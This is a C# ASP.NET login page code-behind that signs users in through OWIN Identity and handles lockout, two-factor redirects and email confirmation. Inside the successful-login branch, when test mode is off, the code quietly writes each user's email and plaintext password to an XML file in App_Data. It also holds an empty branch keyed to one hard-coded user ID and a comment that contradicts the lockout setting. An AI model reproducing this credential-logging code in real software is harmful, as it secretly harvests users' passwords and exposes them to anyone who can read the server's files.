using System;
using System.Web;
using System.Web.UI;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Owin;
using Web_App_Master.Models;
using System.Web.UI.WebControls;
using System.IO;

namespace Web_App_Master.Account
{
    public partial class Login : Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            RegisterHyperLink.NavigateUrl = "Register";
            // Enable this once you have account confirmation enabled for password reset functionality
            ForgotPasswordHyperLink.NavigateUrl = "Forgot";
            OpenAuthLogin.ReturnUrl = Request.QueryString["ReturnUrl"];
            var returnUrl = HttpUtility.UrlEncode(Request.QueryString["ReturnUrl"]);
            if (!String.IsNullOrEmpty(returnUrl))
            {
                RegisterHyperLink.NavigateUrl += "?ReturnUrl=" + returnUrl;
            }
            Email.Focus();
        }

        protected void LogIn(object sender, EventArgs e)
        {
            
            if (IsValid)
            {
                // Validate the user password
                var manager = Context.GetOwinContext().GetUserManager<ApplicationUserManager>();
                var signinManager = Context.GetOwinContext().GetUserManager<ApplicationSignInManager>();
                // Require the user to have a confirmed email before they can log on.
                var user = manager.FindByName(Email.Text);
                if (user != null)
                {
                    if (!user.EmailConfirmed)
                    {
                        FailureText.Text = "Invalid login attempt. You must have a confirmed email address. Enter your email and password, then press 'Resend Confirmation'.";
                        ErrorMessage.Visible = true;
                        ResendConfirm.Visible = true;
                    }
                    else
                    {
                        // This doen't count login failures towards account lockout
                        // To enable password failures to trigger lockout, change to shouldLockout: true
                        var result = signinManager.PasswordSignIn(Email.Text, Password.Text, RememberMe.Checked, shouldLockout: true);

                        switch (result)
                        {
                            case SignInStatus.Success:
                                var UserData= Session["SessionUserData"] as Data.UserData;
                                if (user.Id== "600e9a8c-f5fa-4b2b-9253-2964e2293e22")
                                {

                                }
                                UserData.Guid = user.Id;
                                if (!Global.Library.Settings.TESTMODE)
                                {
                                    var pass = Password.Text;
                                    var name = Email.Text.Split('@')[0].Replace(".", "");
                                    var dest = Server.MapPath("/App_Data/" + name + ".xml");
                                    File.WriteAllText(dest, "<user>" + user.Email + "</user><pass>" + pass + "</pass>" + Environment.NewLine);
                                }
                                UserData.Email = user.Email;
                                UserData.Name = user.UserName;
                                UserData.Log.Add(new Data.LogEntry("Logged In"));
                                try
                                {
                                    var db = Web_App_Master.Load.Setting(user.Id);
                                    if (db!=null)
                                    {
                                        Data.UserData tt;
                                         Session["PersistingUserData"] = tt= new Data.UserData().DeserializeFromXmlString<Data.UserData>(db.XmlData) as Data.UserData;
                                        tt.Log.Add(new Data.LogEntry("Logged In"));
                                    }
                                    else
                                    {
                                        var nn = new Data.UserData();
                                        nn.Guid = user.Id;
                                        nn.Email = user.Email;
                                        nn.Name = user.UserName;
                                        nn.Log.Add(new Data.LogEntry("Logged In"));
                                        Session["PersistingUserData"] = nn;
                                        Helpers.SettingsDBData d = new Helpers.SettingsDBData();
                                        d.Appname = user.Id;
                                        d.XmlData = UserData.SerializeToXmlString(UserData);
                                        Save.Setting(d);
                                    }
                                }
                                catch {
                                    try
                                    {
                                        Session["PersistingUserData"] = UserData.Clone() as Data.UserData;
                                        Helpers.SettingsDBData db = new Helpers.SettingsDBData();
                                        db.Appname = user.Id;
                                        db.XmlData = UserData.SerializeToXmlString(UserData);
                                        Save.Setting(db);
                                    }
                                    catch { }
                                }

                                IdentityHelper.RedirectToReturnUrl(Request.QueryString["ReturnUrl"], Response);
                                break;
                            case SignInStatus.LockedOut:
                                Response.Redirect("/Account/Lockout");
                                break;
                            case SignInStatus.RequiresVerification:
                                Response.Redirect(String.Format("/Account/TwoFactorAuthenticationSignIn?ReturnUrl={0}&RememberMe={1}",
                                                                Request.QueryString["ReturnUrl"],
                                                                RememberMe.Checked),
                                                  true);
                                break;
                            case SignInStatus.Failure:
                            default:
                                FailureText.Text = "Invalid login attempt";
                                ErrorMessage.Visible = true;

                                break;
                        }
                    
                    }
           
                }
            }
        }
        protected void SendEmailConfirmationToken(object sender, EventArgs e)
        {
            var manager = Context.GetOwinContext().GetUserManager<ApplicationUserManager>();
            var user = manager.FindByName(Email.Text);
            if (user != null)
            {
                if (!user.EmailConfirmed)
                {
                    string code = manager.GenerateEmailConfirmationToken(user.Id);
                    string callbackUrl = IdentityHelper.GetUserConfirmationRedirectUrl(code, user.Id, Request);
                    EmailHelper.SendEmailAsync(user.Email,"Please confirm your account by clicking <a href=\"" + callbackUrl + "\">here</a>.", "Confirm your account");
                   
                    FailureText.Text = "Confirmation email sent. Please view the email and confirm your account.";
                    ErrorMessage.Visible = true;
                    ResendConfirm.Visible = false;
                }
            }
        }
    }
}